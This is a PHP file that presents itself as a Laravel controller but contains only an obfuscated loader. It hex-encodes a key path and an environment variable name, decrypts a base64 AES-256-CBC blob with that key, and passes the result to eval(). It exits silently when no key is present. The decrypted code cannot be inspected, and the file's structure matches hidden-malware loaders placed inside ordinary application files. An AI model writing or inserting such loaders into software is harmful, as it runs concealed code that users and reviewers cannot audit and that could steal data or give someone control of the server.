<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('XKS+d4pigV0gQTDlESsHyg==');

$c=base64_decode(

'cA/bYSJcQfbp9qB2Tc/55OfEPXPqfOTYA13CuYta2BNhkNX93mJGGGMmkvBkYDxqH9M07U5bfgbF' .
'8RpaBKkqwiRGgiCWZn8i2TunS9sIcUHq+jN0OppEVl5ewUePSYxF5lB6GmXbIY2v2Z/jGWt4Muhc' .
'+lMhVlFZa6HF4ERL4YipU5wR7zqQDvcV1HUFWjMZffaweSIjx9Ya5ly+HBKAjKQcXmBSVUsalhYj' .
'D32qqI5fWXV070rCAOshp0cqLMFf'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

